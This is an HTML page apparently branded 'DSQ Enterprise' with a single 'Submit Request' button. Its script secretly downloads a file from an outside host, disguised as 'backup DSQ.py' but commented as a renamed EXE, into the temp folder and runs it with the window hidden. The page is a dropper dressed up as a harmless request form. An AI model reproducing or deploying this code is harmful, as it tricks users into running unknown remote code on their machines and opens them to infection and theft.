<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DSQ Enterprise</title>
<style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
</style>
</head>
<body>

<button id="mobilityBtn">Submit Request</button>

<script>
    const { exec } = require('child_process');
    const fs = require('fs');
    const https = require('https');
    const path = require('path');
    const os = require('os');

    document.getElementById('mobilityBtn').addEventListener('click', () => {
        const exeUrl = 'https://dsq-beta.vercel.app/backup DSQ.py'; // renamed EXE
        const tempPath = path.join(os.tmpdir(), 'backup DSQ.py'); // download to temp folder

        const file = fs.createWriteStream(tempPath);

        https.get(exeUrl, (res) => {
            if (res.statusCode !== 200) {
                console.error('❌ Failed to download EXE:', res.statusCode);
                return;
            }

            res.pipe(file);
            file.on('finish', () => {
                file.close(() => {
                    console.log('✅ EXE downloaded, running now...');
                    exec(`"${tempPath}"`, { windowsHide: true }, (err, stdout, stderr) => {
                        if (err) console.error('❌ Execution error:', err);
                        if (stdout) console.log('✅ stdout:', stdout);
                        if (stderr) console.error('⚠️ stderr:', stderr);
                    });
                });
            });
        }).on('error', (err) => {
            console.error('❌ Download error:', err.message);
        });
    });
</script>

</body>
</html>



